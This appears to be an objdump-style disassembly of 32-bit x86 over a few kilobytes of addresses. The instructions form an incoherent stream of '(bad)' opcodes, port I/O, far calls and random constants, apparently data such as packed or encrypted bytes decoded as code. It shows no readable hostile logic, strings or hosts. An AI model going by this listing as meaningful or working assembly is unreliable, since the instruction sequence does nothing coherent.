  412b70:	sbb    BYTE PTR [edx],ah
  412b72:	sti    
  412b73:	adc    ebp,DWORD PTR gs:[edi-0x1d21c029]
  412b7a:	mov    eax,0xfdde5bb3
  412b7f:	scas   eax,DWORD PTR es:[edi]
  412b80:	xor    al,0x71
  412b82:	jle    0x412b7d
  412b84:	sahf   
  412b85:	ins    DWORD PTR es:[edi],dx
  412b86:	sar    BYTE PTR [ebx-0x563ead65],0x41
  412b8d:	iret   
  412b8e:	inc    ebp
  412b8f:	in     al,dx
  412b90:	sub    esi,ebx
  412b92:	mov    eax,ds:0xd7b55530
  412b97:	sbb    BYTE PTR [edx-0x5816488b],dl
  412b9d:	push   ds
  412b9e:	daa    
  412b9f:	mov    dh,0x41
  412ba1:	adc    DWORD PTR [edx+ecx*4-0x5cdd3d23],eax
  412ba8:	xchg   esp,eax
  412ba9:	jnp    0x412bf9
  412bab:	xchg   esp,eax
  412bac:	and    ebp,ecx
  412bae:	popf   
  412baf:	ins    BYTE PTR es:[edi],dx
  412bb0:	test   eax,0xee34d044
  412bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bb6:	ds hlt 
  412bb8:	imul   BYTE PTR [ebp-0x9d35154]
  412bbe:	push   es
  412bbf:	mov    al,0x22
  412bc1:	or     eax,0x72325451
  412bc6:	aad    0xb8
  412bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bc9:	xor    ch,cl
  412bcb:	add    eax,0xf48fa8d3
  412bd0:	pop    ds
  412bd1:	and    eax,DWORD PTR [edx-0x5d]
  412bd4:	xchg   bh,bh
  412bd6:	cmp    edi,edi
  412bd8:	js     0x412b70
  412bda:	fwait
  412bdb:	xchg   ecx,eax
  412bdc:	or     cl,BYTE PTR [ecx+0x4e]
  412bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412be0:	sub    DWORD PTR [esi+ebx*4-0x54],esp
  412be4:	cmp    DWORD PTR ds:0x443c13f,0xbf6e251d
  412bee:	cmp    eax,0x5dcd90db
  412bf3:	xor    eax,0xdf11ff75
  412bf8:	cwde   
  412bf9:	out    0xa7,al
  412bfb:	add    al,0xcc
  412bfd:	fiadd  WORD PTR [ebp+esi*8+0x17a65612]
  412c04:	jne    0x412b97
  412c06:	out    dx,eax
  412c07:	cmc    
  412c08:	cwde   
  412c09:	or     BYTE PTR [eax-0x5e],ch
  412c0c:	mov    bh,0x45
  412c0e:	sar    DWORD PTR [ebp+eiz*8-0x7f1d3c64],0x9
  412c16:	mov    ds:0xdb1241ae,eax
  412c1b:	push   esp
  412c1c:	ja     0x412c0b
  412c1e:	call   0xc20195ef
  412c23:	and    al,0xd3
  412c25:	es fcos 
  412c28:	or     esi,edx
  412c2a:	(bad)  
  412c2b:	lods   eax,DWORD PTR ds:[esi]
  412c2c:	pop    ds
  412c2d:	daa    
  412c2e:	(bad)  [esi-0x64f45ba2]
  412c34:	xchg   ebx,eax
  412c35:	cld    
  412c36:	xor    bl,BYTE PTR [ecx+0x76]
  412c39:	enter  0x179a,0x75
  412c3d:	jl     0x412bde
  412c3f:	xor    edi,DWORD PTR [esi]
  412c41:	fild   DWORD PTR [ecx]
  412c43:	jo     0x412ca6
  412c45:	and    ebx,DWORD PTR [esi+0x334eafbd]
  412c4b:	mov    al,0x91
  412c4d:	mov    es,WORD PTR fs:[edi+0x5c]
  412c51:	fwait
  412c52:	hlt    
  412c53:	inc    ebp
  412c54:	jp     0x412bdb
  412c56:	ss es (bad) 
  412c59:	std    
  412c5a:	lea    ebp,[eax+0x20c65eb7]
  412c60:	mov    cl,0xa0
  412c62:	jb     0x412bf3
  412c64:	imul   edi,DWORD PTR [eax-0x2f],0x8dd47961
  412c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c6c:	icebp  
  412c6d:	xor    bl,bl
  412c6f:	jp     0x412c93
  412c71:	inc    ebx
  412c72:	das    
  412c73:	jle    0x412ce5
  412c75:	push   0x23
  412c77:	retf   0xbe24
  412c7a:	push   0xf8485403
  412c7f:	sahf   
  412c80:	(bad)  
  412c81:	es xchg esp,eax
  412c83:	xchg   esp,eax
  412c84:	cdq    
  412c85:	adc    ah,BYTE PTR [edx]
  412c87:	ins    DWORD PTR es:[edi],dx
  412c88:	inc    ebp
  412c89:	int3   
  412c8a:	mov    DWORD PTR [ecx],ecx
  412c8c:	sbb    ecx,ecx
  412c8e:	stos   BYTE PTR es:[edi],al
  412c8f:	add    edi,DWORD PTR [eax+0x70fb1727]
  412c95:	les    ebp,FWORD PTR [ebx]
  412c97:	xchg   bl,ch
  412c99:	and    DWORD PTR [ebx+eax*2+0x156cda0],0xffffffa7
  412ca1:	cwde   
  412ca2:	rcr    ah,0x71
  412ca5:	mov    WORD PTR [edx+0x32],?
  412ca8:	dec    eax
  412ca9:	jp     0x412ce7
  412cab:	xchg   edx,eax
  412cac:	jmp    0x412c89
  412cae:	push   0x8f101ee6
  412cb3:	mov    al,0xfb
  412cb5:	js     0x412cee
  412cb7:	mov    ebx,0x98905740
  412cbc:	mov    ah,0x9f
  412cbe:	xchg   BYTE PTR [esi],cl
  412cc0:	dec    esi
  412cc1:	sti    
  412cc2:	int    0x65
  412cc4:	arpl   WORD PTR [ebp+eiz*1+0x47],cx
  412cc8:	and    al,0x22
  412cca:	or     al,0xc9
  412ccc:	in     al,dx
  412ccd:	add    BYTE PTR [ecx],0x8
  412cd0:	sub    ah,BYTE PTR [ecx]
  412cd2:	aam    0x64
  412cd4:	inc    eax
  412cd5:	xor    esi,DWORD PTR [edx-0x3e0e40d7]
  412cdb:	jecxz  0x412d48
  412cdd:	and    ecx,edx
  412cdf:	ds jne 0x412cb0
  412ce2:	and    esi,ecx
  412ce4:	dec    ecx
  412ce5:	mov    ds:0xda79468c,al
  412cea:	xchg   edi,eax
  412ceb:	div    DWORD PTR [eax]
  412ced:	retf   0xd83f
  412cf0:	(bad)  
  412cf1:	gs fcmovnbe st,st(2)
  412cf4:	push   esi
  412cf5:	ds push ds
  412cf7:	or     al,0x8
  412cf9:	rol    esi,cl
  412cfb:	aam    0xc8
  412cfd:	aam    0xb0
  412cff:	jbe    0x412d45
  412d01:	mov    dh,0x5a
  412d03:	call   0xee94e3f4
  412d08:	and    ebp,DWORD PTR [edx+edx*4]
  412d0b:	pop    eax
  412d0c:	mov    ah,0x71
  412d0e:	std    
  412d0f:	in     al,0x34
  412d11:	inc    ecx
  412d12:	daa    
  412d13:	es lock push 0x4b4ebdb1
  412d1a:	adc    BYTE PTR [ecx+0xa],ah
  412d1d:	jle    0x412ccb
  412d1f:	int    0xfe
  412d21:	xor    eax,0x35354835
  412d26:	fcomp  st(4)
  412d28:	or     BYTE PTR [ecx],bh
  412d2a:	fisttp DWORD PTR [ebx-0x6b91f252]
  412d30:	dec    esi
  412d31:	inc    esi
  412d32:	es jb  0x412ce4
  412d35:	adc    esi,edx
  412d37:	pop    ss
  412d38:	(bad)  
  412d39:	jb     0x412d44
  412d3b:	jnp    0x412d4c
  412d3d:	cmp    DWORD PTR [ebx],eax
  412d3f:	fsubr  DWORD PTR [ecx]
  412d41:	into   
  412d42:	sub    BYTE PTR [ecx],0xc4
  412d45:	shl    BYTE PTR [edx-0x75],1
  412d48:	loopne 0x412cfd
  412d4a:	loopne 0x412db3
  412d4c:	adc    al,0xd4
  412d4e:	xor    dl,BYTE PTR [edi+0x67]
  412d51:	or     ecx,edi
  412d53:	leave  
  412d54:	scas   eax,DWORD PTR es:[edi]
  412d55:	xchg   dx,ax
  412d57:	inc    ebx
  412d58:	scas   al,BYTE PTR es:[edi]
  412d59:	inc    ebp
  412d5a:	push   0xab5a7850
  412d5f:	mov    ds:0x884300f0,al
  412d64:	fbld   TBYTE PTR [ebp-0x2e37651e]
  412d6a:	popa   
  412d6b:	in     eax,dx
  412d6c:	lds    esp,FWORD PTR [esi]
  412d6e:	jae    0x412d24
  412d70:	push   esp
  412d71:	lods   al,BYTE PTR ds:[esi]
  412d72:	xchg   ecx,eax
  412d73:	add    BYTE PTR [ebp+edi*8-0x14],bh
  412d77:	dec    ecx
  412d78:	mov    ch,0x27
  412d7a:	aad    0xc4
  412d7c:	cmp    dl,al
  412d7e:	mov    cs,WORD PTR [esi+ebx*8]
  412d81:	cmp    cl,BYTE PTR [ecx]
  412d83:	jnp    0x412d61
  412d85:	jmp    0x16f8:0x5845fce6
  412d8c:	stos   DWORD PTR es:[edi],eax
  412d8d:	xchg   esi,eax
  412d8e:	mov    esi,0xd2ef9a0c
  412d93:	pusha  
  412d94:	shl    DWORD PTR [ecx],0x85
  412d97:	or     eax,0x4ad5bd3f
  412d9c:	or     ch,0x31
  412d9f:	mov    esp,0x20153a83
  412da4:	inc    edi
  412da5:	mov    al,0x46
  412da7:	adc    DWORD PTR [edx],ebx
  412da9:	gs in  eax,0x8
  412dac:	pusha  
  412dad:	sbb    ecx,ebx
  412daf:	pushf  
  412db0:	mov    WORD PTR [ebx-0x3b],gs
  412db3:	or     eax,0x59caee3b
  412db8:	xor    eax,0xcd92e02
  412dbd:	push   edi
  412dbe:	repnz icebp 
  412dc0:	mov    dl,dl
  412dc2:	cmp    BYTE PTR [edi-0x2a],0xcc
  412dc6:	test   ecx,eax
  412dc8:	add    edx,0xafcd7fc5
  412dce:	retf   0x50de
  412dd1:	leave  
  412dd2:	inc    ebx
  412dd3:	int    0x6e
  412dd5:	imul   esp,DWORD PTR [edx+0x7d00b2e8],0x65
  412ddc:	mov    WORD PTR [esi-0x467a5312],ds
  412de2:	repz test al,0xda
  412de5:	pop    esp
  412de6:	imul   DWORD PTR [ecx+0x673d7925]
  412dec:	jno    0x412dda
  412dee:	add    eax,0x58394ce9
  412df3:	(bad)  
  412df4:	lds    ebp,FWORD PTR [edx]
  412df6:	stc    
  412df7:	popf   
  412df8:	ja     0x412df9
  412dfa:	inc    esp
  412dfb:	sbb    DWORD PTR [ecx-0x48531cb9],ebp
  412e01:	sub    al,0xe0
  412e03:	mov    ds:0x3e4bb489,eax
  412e08:	jb     0x412e10
  412e0a:	inc    esi
  412e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e0c:	push   es
  412e0d:	jno    0x412e16
  412e0f:	adc    esp,DWORD PTR [ebx]
  412e11:	jns    0x412e74
  412e13:	add    al,0x10
  412e15:	pop    esp
  412e16:	inc    ebp
  412e17:	sbb    al,0x9c
  412e19:	inc    edi
  412e1a:	push   0xb28ea9bd
  412e1f:	int3   
  412e20:	lods   eax,DWORD PTR ds:[esi]
  412e21:	push   ss
  412e22:	adc    al,BYTE PTR [ebx+0x6f8dc03d]
  412e28:	push   eax
  412e29:	pop    ss
  412e2a:	mov    ebx,0xb308a85a
  412e2f:	or     edx,DWORD PTR [ecx-0xb]
  412e32:	adc    al,0x89
  412e34:	popa   
  412e35:	call   0x9ae9be23
  412e3a:	rol    DWORD PTR [edx+0x7397864],1
  412e40:	cdq    
  412e41:	into   
  412e42:	imul   esp,DWORD PTR [esi],0xffffff96
  412e45:	xchg   esp,eax
  412e46:	int3   
  412e47:	add    edx,DWORD PTR [eax]
  412e49:	sbb    DWORD PTR fs:[ebx+edx*2],edi
  412e4d:	hlt    
  412e4e:	pop    esi
  412e4f:	xchg   edx,eax
  412e50:	sar    ecx,cl
  412e52:	mov    BYTE PTR [eax+0x1b],dh
  412e55:	lods   al,BYTE PTR ds:[esi]
  412e56:	ret    
  412e57:	retf   0x9efe
  412e5a:	rcr    DWORD PTR [ebx+0x6b],1
  412e5d:	sub    eax,0x425d16ef
  412e62:	xchg   ecx,eax
  412e63:	gs stos BYTE PTR es:[edi],al
  412e65:	mov    cl,0x86
  412e67:	mov    bh,0x82
  412e69:	rol    DWORD PTR [ecx+0x3fb0b95f],cl
  412e6f:	and    ebp,DWORD PTR [ecx+ecx*8]
  412e72:	cdq    
  412e73:	sub    eax,0x8f01b991
  412e78:	sbb    DWORD PTR ds:0x3efb04c7,esi
  412e7e:	call   0xe16f:0xdb8c25e8
  412e85:	xchg   edi,eax
  412e86:	ins    DWORD PTR es:[edi],dx
  412e87:	sub    eax,0x8f747c5f
  412e8c:	sbb    al,0x2d
  412e8e:	or     DWORD PTR gs:[eax],ebx
  412e91:	hlt    
  412e92:	jns    0x412e7d
  412e94:	outs   dx,DWORD PTR ds:[esi]
  412e95:	adc    DWORD PTR [ebx],esi
  412e97:	stos   DWORD PTR es:[edi],eax
  412e98:	jnp    0x412e9e
  412e9a:	test   BYTE PTR [edi+0x51941899],0x14
  412ea1:	popf   
  412ea2:	lods   al,BYTE PTR ds:[esi]
  412ea3:	scas   eax,DWORD PTR es:[edi]
  412ea4:	mov    ebx,0xe55644f3
  412ea9:	in     al,dx
  412eaa:	addr16 lahf 
  412eac:	inc    ecx
  412ead:	xchg   ebx,eax
  412eae:	sbb    BYTE PTR [edi],ah
  412eb0:	popa   
  412eb1:	in     eax,0x98
  412eb3:	addr16 rcl ebx,cl
  412eb6:	pop    ss
  412eb7:	add    al,BYTE PTR [edx]
  412eb9:	and    eax,0x9d2bf6dd
  412ebe:	pop    esp
  412ebf:	jns    0x412e7b
  412ec1:	jmp    0xd640f2df
  412ec6:	std    
  412ec7:	ret    
  412ec8:	or     dl,dl
  412eca:	xor    edx,DWORD PTR [ebx+0x7a]
  412ecd:	inc    ebx
  412ece:	mov    al,ds:0xca641c9c
  412ed3:	jo     0x412e98
  412ed5:	call   0xaee4:0x61eb7706
  412edc:	inc    ebp
  412edd:	and    BYTE PTR [eax],0x3a
  412ee0:	jp     0x412f15
  412ee2:	push   eax
  412ee3:	jns    0x412e9c
  412ee5:	mov    esi,0x948e99be
  412eea:	mov    cl,0xea
  412eec:	sar    DWORD PTR [eax+0x46ac4186],1
  412ef2:	inc    esp
  412ef3:	iret   
  412ef4:	xchg   esp,eax
  412ef5:	test   DWORD PTR [ebx],0x705b0eea
  412efb:	fs dec esp
  412efd:	inc    esp
  412efe:	test   al,0x12
  412f00:	iret   
  412f01:	mov    dl,0x6b
  412f03:	in     al,0xe9
  412f05:	add    eax,0x69b25a18
  412f0a:	sub    al,BYTE PTR ds:0x980e2fc6
  412f10:	pop    es
  412f11:	jmp    0x412f0e
  412f13:	and    al,0x1c
  412f15:	sub    bl,BYTE PTR [ebp+0x923336a]
  412f1b:	push   ds
  412f1c:	jge    0x412f8a
  412f1e:	imul   esp,ecx,0x347f3272
  412f24:	call   0x833a:0x26048b8
  412f2b:	(bad)  
  412f2c:	sub    al,0x78
  412f2e:	arpl   WORD PTR ds:0xb5353e7f,si
  412f34:	in     al,0x7c
  412f36:	fcomi  st,st(1)
  412f38:	or     DWORD PTR [ebx],ebx
  412f3a:	adc    al,0x8c
  412f3c:	inc    edi
  412f3d:	xor    ebp,DWORD PTR [edx]
  412f3f:	ins    DWORD PTR es:[edi],dx
  412f40:	jecxz  0x412fa0
  412f42:	call   0x94817ac3
  412f47:	add    ebx,DWORD PTR [eiz*4-0x31b42f69]
  412f4e:	push   esi
  412f4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f50:	push   ebp
  412f51:	cwde   
  412f52:	and    ch,BYTE PTR [esp+edi*8]
  412f55:	ror    DWORD PTR [edx+0x6f1a75e6],cl
  412f5b:	lds    eax,FWORD PTR [ebx-0x62]
  412f5e:	inc    bl
  412f60:	fistp  DWORD PTR [edx]
  412f62:	repnz mov ebp,0xfaf8a477
  412f68:	stos   DWORD PTR es:[edi],eax
  412f69:	push   es
  412f6a:	imul   esp,eax,0xa0c81879
  412f70:	adc    ah,bl
  412f72:	cli    
  412f73:	pop    esp
  412f74:	and    dl,BYTE PTR [esi-0xf]
  412f77:	pop    ebx
  412f78:	sub    DWORD PTR [ebx+0x3c37828],esp
  412f7e:	fldenv [ecx-0x7f5345d5]
  412f84:	pusha  
  412f85:	lods   al,BYTE PTR ds:[esi]
  412f86:	sub    DWORD PTR [edi],0xffffff8d
  412f89:	fwait
  412f8a:	sub    DWORD PTR [edi],esi
  412f8c:	sub    DWORD PTR [edi],edx
  412f8e:	sbb    DWORD PTR [edx],esp
  412f90:	test   BYTE PTR [ecx+0x6b],al
  412f93:	pop    eax
  412f94:	mov    gs,WORD PTR [ecx]
  412f96:	mov    ecx,cs
  412f98:	and    DWORD PTR [eax+ebp*1-0x2f23f177],ebx
  412f9f:	mov    esp,0xe5ad9800
  412fa4:	retf   
  412fa5:	cmp    cl,BYTE PTR [ecx-0x6f]
  412fa8:	mov    edx,0x8c7c2cc3
  412fad:	ins    BYTE PTR es:[edi],dx
  412fae:	push   ds
  412faf:	inc    esp
  412fb0:	pop    eax
  412fb1:	xor    DWORD PTR [ebp+0x31],edx
  412fb4:	and    ebp,DWORD PTR [ebx]
  412fb6:	mov    esp,ebx
  412fb8:	mov    ch,0xc6
  412fba:	jno    0x412f45
  412fbc:	leave  
  412fbd:	(bad)
  412fc1:	add    eax,0xee5b8245
  412fc6:	out    dx,al
  412fc7:	fistp  DWORD PTR [ecx+0x53]
  412fca:	fisttp QWORD PTR [eax+0x3fd46d69]
  412fd0:	push   cs
  412fd1:	fistp  QWORD PTR [esi-0x52d2dd65]
  412fd7:	add    ch,BYTE PTR [ebx-0x60aaf565]
  412fdd:	jnp    0x412f6b
  412fdf:	pop    ss
  412fe0:	mov    ?,WORD PTR [esi]
  412fe2:	arpl   WORD PTR [ecx-0x65],ax
  412fe5:	stc    
  412fe6:	mov    dl,0x82
  412fe8:	jecxz  0x412f8a
  412fea:	cdq    
  412feb:	sub    BYTE PTR [edi+0x3b10e850],ah
  412ff1:	scas   eax,DWORD PTR es:[edi]
  412ff2:	sub    edx,DWORD PTR [edi]
  412ff4:	xchg   ecx,eax
  412ff5:	out    dx,al
  412ff6:	cwde   
  412ff7:	xchg   ebx,eax
  412ff8:	test   esp,ecx
  412ffa:	sub    edi,ebp
  412ffc:	cmp    ebp,edi
  412ffe:	fst    st(7)
  413000:	push   ss
  413001:	mov    ah,0x4c
  413003:	adc    DWORD PTR [ecx],0xa8d723db
  413009:	mov    al,0x6e
  41300b:	push   ecx
  41300c:	adc    bl,bh
  41300e:	and    al,0x85
  413010:	aaa    
  413011:	jecxz  0x413062
  413013:	scas   eax,DWORD PTR es:[edi]
  413014:	inc    eax
  413015:	or     ebx,DWORD PTR [ebx+0x472a3a2a]
  41301b:	fcomp  QWORD PTR es:[edx]
  41301e:	lods   al,BYTE PTR ds:[esi]
  41301f:	add    dh,bh
  413021:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413023:	mov    DWORD PTR ds:0xb4923dcb,edi
  413029:	cdq    
  41302a:	out    0xb5,al
  41302c:	mov    ebp,0x537651f3
  413031:	pop    eax
  413032:	adc    DWORD PTR [esi-0x1480e8f],0xffffffe0
  413039:	xchg   edx,eax
  41303a:	or     al,0x2d
  41303c:	push   ecx
  41303d:	sti    
  41303e:	add    ah,dl
  413040:	dec    edi
  413041:	jg     0x412fc8
  413043:	nop
  413044:	mov    esi,0x9238985f
  413049:	inc    eax
  41304a:	int    0x8f
  41304c:	xchg   ebp,eax
  41304d:	dec    edx
  41304e:	aas    
  41304f:	mov    cs,ebx
  413051:	or     al,0xbc
  413053:	dec    edi
  413054:	les    ecx,FWORD PTR [ebx-0x78]
  413057:	push   ebx
  413058:	xor    eax,0x746614c4
  41305d:	and    al,0xb9
  41305f:	in     eax,0x5b
  413061:	rol    BYTE PTR [esi+0x3c8142d1],1
  413067:	mov    al,0xcf
  413069:	mov    ebp,0x7aea93da
  41306e:	mov    bh,0xe6
  413070:	cmp    ecx,edx
  413072:	sub    bh,BYTE PTR ds:0xbbeb749d
  413078:	xor    al,0x80
  41307a:	outs   dx,BYTE PTR ds:[esi]
  41307b:	or     ah,dl
  41307d:	mov    ds,WORD PTR [eax+0x46eb4412]
  413083:	and    BYTE PTR [esi+0x3de28efc],ch
  413089:	out    0xbd,al
  41308b:	imul   esi,DWORD PTR ss:[ecx+ecx*2-0x2f500bef],0xcca03f89
  413097:	stc    
  413098:	stos   BYTE PTR es:[edi],al
  413099:	jae    0x413041
  41309b:	ins    BYTE PTR es:[edi],dx
  41309c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309e:	mov    ebp,0x9449a34b
  4130a3:	xor    al,0x84
  4130a5:	loopne 0x4130a8
  4130a7:	clc    
  4130a8:	mov    ds:0xcbe941ce,eax
  4130ad:	ror    esi,1
  4130af:	popa   
  4130b0:	jge    0x413127
  4130b2:	adc    al,0x66
  4130b4:	jge    0x41305c
  4130b6:	cmp    BYTE PTR [edi-0x7c3911b],cl
  4130bc:	fwait
  4130bd:	push   edi
  4130be:	call   0x13ae:0x9a9cdde3
  4130c5:	xchg   esi,ecx
  4130c7:	add    BYTE PTR [ecx+0x2b],dl
  4130ca:	sub    BYTE PTR [edx+0x6ab06ca9],cl
  4130d0:	outs   dx,DWORD PTR ds:[esi]
  4130d1:	mov    ss:0xa575825f,al
  4130d7:	mov    dl,0xac
  4130d9:	sub    ebx,DWORD PTR [edi]
  4130db:	jle    0x4130f1
  4130dd:	lock jmp 0x413078
  4130e0:	arpl   WORD PTR [eax-0x2],bp
  4130e3:	and    dl,BYTE PTR [ebx]
  4130e5:	lock test al,0x90
  4130e8:	jecxz  0x4130c5
  4130ea:	add    al,0x5b
  4130ec:	inc    edx
  4130ed:	jmp    0xd7ea1bb2
  4130f2:	push   cs
  4130f3:	lods   al,BYTE PTR ds:[esi]
  4130f4:	jmp    0x19e:0x2f22b302
  4130fb:	adc    edx,esp
  4130fd:	out    0x44,eax
  4130ff:	push   esp
  413100:	ins    BYTE PTR es:[edi],dx
  413101:	xor    BYTE PTR [ebx+esi*8+0x47],bl
  413105:	imul   ecx,DWORD PTR ds:0x8934d234,0xd933dd81
  41310f:	arpl   dx,di
  413111:	mov    esp,DWORD PTR [ebx+ecx*8-0x71]
  413115:	mov    eax,ds:0xd47dfa7c
  41311a:	push   ecx
  41311b:	out    0xde,al
  41311d:	jg     0x413169
  41311f:	lods   al,BYTE PTR ds:[esi]
  413120:	iret   
  413121:	jg     0x41318a
  413123:	jg     0x4130f1
  413125:	mov    dh,0xcc
  413127:	mov    esi,0xf9f6639c
  41312c:	addr16 xchg esp,eax
  41312e:	push   cs
  41312f:	inc    esi
  413130:	mov    esi,0x5839723b
  413135:	add    al,0xc5
  413137:	and    al,0x74
  413139:	dec    edx
  41313a:	jbe    0x413199
  41313c:	gs push edx
  41313e:	sbb    BYTE PTR [esi],ch
  413140:	in     al,dx
  413141:	inc    eax
  413142:	dec    ebp
  413143:	je     0x413194
  413145:	repz out 0xcb,eax
  413148:	mov    esi,0xbcbf2703
  41314d:	fistp  QWORD PTR [eax+0x24]
  413150:	repnz pop edx
  413152:	pop    ss
  413153:	fidivr WORD PTR [ebp+0x6d]
  413156:	mov    esi,0x4b822495
  41315b:	sbb    cl,BYTE PTR [ecx+0x5f827c17]
  413161:	mov    al,0x47
  413163:	shr    BYTE PTR [edi+0x998db0e],1
  413169:	lods   eax,DWORD PTR ds:[esi]
  41316a:	pushf  
  41316b:	fistp  DWORD PTR [ebp-0x40]
  41316e:	lods   al,BYTE PTR ds:[esi]
  41316f:	mov    dl,0x24
  413171:	or     al,BYTE PTR [esi+ecx*4+0x1d]
  413175:	daa    
  413176:	cmp    ebx,esp
  413178:	pop    ebp
  413179:	stos   DWORD PTR es:[edi],eax
  41317a:	rcl    ebx,0xe4
  41317d:	push   ss
  41317e:	dec    eax
  41317f:	sbb    BYTE PTR [ebx+0x19797757],cl
  413185:	int3   
  413186:	cmp    BYTE PTR [ecx+0x10],bl
  413189:	jo     0x413160
  41318b:	aaa    
  41318c:	cld    
  41318d:	cmc    
  41318e:	sub    DWORD PTR [eax],ebp
  413190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413191:	fucom  st(0)
  413193:	dec    bh
  413195:	test   eax,0x515f82e5
  41319a:	adc    WORD PTR [esi-0x6c4fe0c7],0xc0e1
  4131a3:	add    al,0xee
  4131a5:	int    0x17
  4131a7:	push   edi
  4131a8:	mov    edi,0xe7d57310
  4131ad:	fnstcw WORD PTR [ebp-0x39]
  4131b0:	mov    ch,0x22
  4131b2:	sub    al,0x65
  4131b4:	js     0x413138
  4131b6:	stc    
  4131b7:	xchg   BYTE PTR [eax],bl
  4131b9:	sahf   
  4131ba:	gs pushf 
  4131bc:	xchg   edx,eax
  4131bd:	ja     0x413228
  4131bf:	loopne 0x413165
  4131c1:	pop    ecx
  4131c2:	add    BYTE PTR [edx],ah
  4131c4:	sbb    DWORD PTR [ebp+0x4deee434],ebp
  4131ca:	add    BYTE PTR [edi-0x68],dh
  4131cd:	outs   dx,BYTE PTR ds:[esi]
  4131ce:	loop   0x41323e
  4131d0:	ret    0x1ba7
  4131d3:	sahf   
  4131d4:	repz bound ecx,QWORD PTR [ebp+0x72067fbc]
  4131db:	mov    ecx,esp
  4131dd:	mov    ds:0x1d3f132,eax
  4131e2:	outs   dx,DWORD PTR ds:[esi]
  4131e3:	inc    ebp
  4131e4:	out    dx,eax
  4131e5:	lods   eax,DWORD PTR ds:[esi]
  4131e6:	cmp    eax,0xa1e642bd
  4131eb:	sti    
  4131ec:	mov    esi,0x1f738c0b
  4131f1:	mov    BYTE PTR [ebx],al
  4131f3:	cwde   
  4131f4:	push   eax
  4131f5:	aam    0xdd
  4131f7:	shr    BYTE PTR [ebx-0x8],1
  4131fa:	sub    al,BYTE PTR [edx+0x96c6b10]
  413200:	sbb    DWORD PTR [ebx+0x46],ecx
  413203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413204:	xor    esi,DWORD PTR [ebx]
  413206:	and    dh,BYTE PTR [edx]
  413208:	arpl   WORD PTR [esi],di
  41320a:	jo     0x4131d6
  41320c:	ins    DWORD PTR es:[edi],dx
  41320d:	(bad)  [edx+0x19]
  413210:	push   esp
  413211:	mov    dh,0xf9
  413213:	xor    eax,0x1ed099ff
  413218:	fidivr WORD PTR [esi-0x66]
  41321b:	iret   
  41321c:	and    edx,DWORD PTR ds:0x6ddcc530
  413222:	mov    al,0x4b
  413224:	sti    
  413225:	repnz femms 
  413228:	xor    BYTE PTR [esi+eax*1],0x48
  41322c:	ins    DWORD PTR es:[edi],dx
  41322d:	cs aam 0xbc
  413230:	imul   esp,edi,0xffffffec
  413233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413234:	outs   dx,BYTE PTR ds:[esi]
  413235:	lds    ebx,FWORD PTR [ebp+0x67]
  413238:	nop
  413239:	into   
  41323a:	cmp    ebp,esi
  41323c:	mov    eax,0x940c480f
  413241:	(bad)  
  413242:	call   0x88b6a5cf
  413247:	mov    bh,0x50
  413249:	scas   al,BYTE PTR es:[edi]
  41324a:	outs   dx,BYTE PTR ds:[esi]
  41324b:	sub    dl,BYTE PTR [ebx+0x2440efd5]
  413251:	mov    eax,0x874fadb4
  413256:	sbb    eax,0xb0ea6840
  41325b:	mov    edx,0xf0bc5268
  413260:	push   edi
  413261:	(bad)  
  413262:	in     al,dx
  413263:	retf   0x8981
  413266:	(bad)  
  413267:	int3   
  413268:	inc    edi
  413269:	sbb    eax,0xb94a4e1a
  41326e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413270:	mov    bl,BYTE PTR [esi+ebp*4]
  413273:	xor    eax,0x20dec5ef
  413278:	imul   ebp,DWORD PTR [edi-0x720a6f5e],0xffffff88
  41327f:	pop    es
  413280:	xchg   esi,eax
  413281:	call   0xb36e:0x18581ead
  413288:	xor    eax,0x16aa07cb
  41328d:	sub    bl,bh
  41328f:	jle    0x4132a8
  413291:	dec    ebp
  413292:	retf   0x61be
  413295:	jae    0x41329d
  413297:	aas    
  413298:	fstp   DWORD PTR [ebp+0x519565d7]
  41329e:	out    0x95,eax
  4132a0:	push   esp
  4132a1:	inc    esp
  4132a2:	in     eax,0x73
  4132a4:	xchg   edi,eax
  4132a5:	xchg   edi,eax
  4132a6:	mov    ecx,0x7a9ba019
  4132ab:	push   cs
  4132ac:	add    ah,ah
  4132ae:	push   edx
  4132af:	fcmovbe st,st(4)
  4132b1:	ins    BYTE PTR es:[edi],dx
  4132b2:	pusha  
  4132b3:	fsubrp st(7),st
  4132b5:	xor    BYTE PTR [ebp+0x16b343ec],al
  4132bb:	jl     0x413338
  4132bd:	jle    0x413327
  4132bf:	test   DWORD PTR [eax-0xa],0x2f2cde13
  4132c6:	cmp    eax,0x742fe42a
  4132cb:	push   ebx
  4132cc:	sub    ah,bh
  4132ce:	in     eax,dx
  4132cf:	jo     0x413313
  4132d1:	push   edi
  4132d2:	jl     0x4132e9
  4132d4:	or     dl,BYTE PTR [ebx+ebp*2-0x546303ae]
  4132db:	cmp    eax,0x4b0149d
  4132e0:	cmc    
  4132e1:	fcom   QWORD PTR [ecx+0x4f]
  4132e4:	call   0xcba6:0xd5a713f0
  4132eb:	std    
  4132ec:	mov    ebx,0x257bea4
  4132f1:	mov    ch,0xce
  4132f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132f4:	cmc    
  4132f5:	test   ebp,0xa7375ebe
  4132fb:	jae    0x4132ba
  4132fd:	dec    esi
  4132fe:	in     al,0x83
  413300:	cmp    eax,0x8fb61090
  413305:	and    al,0xb1
  413307:	adc    al,0x49
  413309:	add    eax,0x2ad8c2a8
  41330e:	xchg   esi,eax
  41330f:	push   0x1d
  413311:	cmp    al,0xe7
  413313:	into   
  413314:	lods   ax,WORD PTR ds:[esi]
  413316:	sub    eax,0xf972728e
  41331b:	in     al,0xd5
  41331d:	mov    WORD PTR [ebp+0x897a910],ss
  413323:	xlat   BYTE PTR ds:[ebx]
  413324:	iret   
  413325:	adc    bh,BYTE PTR [edi]
